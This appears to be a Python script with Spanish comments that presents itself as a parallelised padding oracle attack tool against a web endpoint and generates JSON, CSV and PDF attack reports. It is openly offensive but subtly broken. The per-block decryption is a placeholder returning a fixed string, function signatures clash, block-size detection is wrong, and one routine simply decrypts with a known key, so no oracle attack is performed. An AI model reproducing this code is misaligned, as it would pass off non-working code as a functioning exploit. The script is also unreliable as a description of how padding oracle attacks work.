import concurrent.futures
import csv
import json
import requests
from binascii import unhexlify, hexlify
from Crypto.Cipher import AES, DES
import pdfkit

# Configuración
BLOCK_SIZE = 16  # Tamaño del bloque para AES (cambia según el algoritmo)
API_URL = "http://example.com/padding_oracle"
KEY = "your-256-bit-key"

# Detectar el algoritmo basado en el tamaño del bloque
def detect_encryption_algorithm(encrypted_data):
    """Detecta automáticamente el algoritmo de cifrado basado en el tamaño del bloque."""
    block_size = len(encrypted_data) // 2  # asumiendo que el dato está en hexadecimal
    if block_size == 16:
        return "AES"
    elif block_size == 8:
        return "DES"
    elif block_size == 24:
        return "3DES"
    else:
        return "Desconocido"

# Soporte para diferentes modos de operación
def decrypt_with_mode(target_url, encrypted_data, mode):
    """Descifra los datos usando el modo de cifrado especificado."""
    key = unhexlify(KEY)  # Asegúrate de manejar la clave correctamente
    
    if mode == "CBC":
        cipher = AES.new(key, AES.MODE_CBC, iv=unhexlify(encrypted_data[:32]))
        decrypted_data = cipher.decrypt(unhexlify(encrypted_data[32:]))
    elif mode == "CTR":
        cipher = AES.new(key, AES.MODE_CTR, nonce=unhexlify(encrypted_data[:16]))
        decrypted_data = cipher.decrypt(unhexlify(encrypted_data[16:]))
    elif mode == "GCM":
        cipher = AES.new(key, AES.MODE_GCM, nonce=unhexlify(encrypted_data[:16]))
        decrypted_data, tag = cipher.decrypt_and_verify(unhexlify(encrypted_data[16:]), unhexlify(encrypted_data[-32:]))
    else:
        print(f"[⚠️] Modo de operación no soportado: {mode}")
        return None
    
    return decrypted_data

def parallel_decrypt_block(target_url, blocks, block_idx):
    """Función paralelizada para descifrar un bloque."""
    previous_block = blocks[block_idx - 1]
    target_block = blocks[block_idx]
    decrypted_block = decrypt_block(target_url, previous_block, target_block)
    return decrypted_block

# Exploit padding oracle (usando paralelización)
def exploit_padding_oracle_parallel(target_url, encrypted_data):
    blocks = [encrypted_data[i:i+BLOCK_SIZE*2] for i in range(0, len(encrypted_data), BLOCK_SIZE*2)]
    decrypted_blocks = []
    
    # Paralelización del proceso de descifrado de bloques
    with concurrent.futures.ThreadPoolExecutor() as executor:
        futures = []
        for i in range(1, len(blocks)):
            futures.append(executor.submit(parallel_decrypt_block, target_url, blocks, i))
        
        for future in concurrent.futures.as_completed(futures):
            decrypted_blocks.append(future.result())
    
    decrypted_text = "".join(decrypted_blocks)
    print(f"[✅] Texto descifrado: {decrypted_text}")
    save_results(decrypted_text)
    return decrypted_text

# Detectar y manejar el algoritmo de cifrado
def handle_encryption_algorithm(target_url, encrypted_data):
    algorithm = detect_encryption_algorithm(encrypted_data)
    print(f"[🔐] Algoritmo detectado: {algorithm}")
    
    if algorithm == "AES":
        return exploit_padding_oracle_parallel(target_url, encrypted_data)
    elif algorithm == "DES":
        return exploit_padding_oracle(target_url, encrypted_data)
    else:
        print(f"[⚠️] Algoritmo desconocido: {algorithm}. No compatible con el script.")
        return None

# Evaluar vulnerabilidad del modo de operación
def evaluate_vulnerability_of_mode(mode):
    """Evalúa la vulnerabilidad del modo de operación especificado."""
    if mode == "CBC":
        print("[🔍] El modo CBC es susceptible a Padding Oracle Attack.")
    elif mode == "CTR":
        print("[✅] El modo CTR no es vulnerable a Padding Oracle Attack debido a su diseño.")
    elif mode == "GCM":
        print("[✅] El modo GCM es seguro frente a Padding Oracle Attack, pero puede ser vulnerable a otros ataques.")
    else:
        print("[⚠️] Modo no reconocido para evaluación de vulnerabilidad.")

# Generación de reportes detallados
def generate_report(decrypted_text, mode, algorithm):
    report = {
        "decrypted_text": decrypted_text,
        "algorithm_used": algorithm,
        "mode_of_operation": mode,
        "attack_success": True,
        "vulnerabilities": ["Padding Oracle"]
    }
    
    with open("padding_oracle_report.json", "w") as json_file:
        json.dump(report, json_file, indent=4)

    with open("padding_oracle_report.csv", "w", newline="") as csv_file:
        writer = csv.writer(csv_file)
        writer.writerow(["Decrypted Text", "Algorithm", "Mode", "Success", "Vulnerabilities"])
        writer.writerow([decrypted_text, algorithm, mode, "True", "Padding Oracle"])
    
    pdf_content = f"<h1>Padding Oracle Attack Report</h1><p>Decrypted Text: {decrypted_text}</p>"
    pdfkit.from_string(pdf_content, "padding_oracle_report.pdf")
    
    print("[📄] Reportes generados: padding_oracle_report.json, padding_oracle_report.csv, padding_oracle_report.pdf.")

# Función principal de descifrado usando Padding Oracle Attack
def exploit_padding_oracle(target_url, encrypted_data):
    blocks = [encrypted_data[i:i+BLOCK_SIZE*2] for i in range(0, len(encrypted_data), BLOCK_SIZE*2)]
    decrypted_data = ""
    
    # Proceso de explotación del ataque
    for block_idx in range(1, len(blocks)):
        block = blocks[block_idx]
        decrypted_block = decrypt_block(target_url, block)
        decrypted_data += decrypted_block
    
    print(f"[✅] Datos descifrados con éxito: {decrypted_data}")
    generate_report(decrypted_data, "CBC", "AES")
    return decrypted_data

# Función para descifrar un bloque individual
def decrypt_block(target_url, encrypted_block):
    # Placeholder para la lógica de descifrado de un solo bloque
    decrypted_block = "decrypted_data"
    return decrypted_block

# Función para guardar resultados
def save_results(decrypted_text):
    with open("decrypted_data.txt", "w") as f:
        f.write(decrypted_text)

# Función de ejecución
def main():
    target_url = "http://example.com/padding_oracle"
    encrypted_data = "encrypted_data_string_here"
    
    # Exploiting padding oracle
    decrypted_text = handle_encryption_algorithm(target_url, encrypted_data)
    
    if decrypted_text:
        print(f"[✅] Ataque exitoso: {decrypted_text}")
    else:
        print("[⚠️] No se pudo realizar el ataque.")

if __name__ == "__main__":
    main()
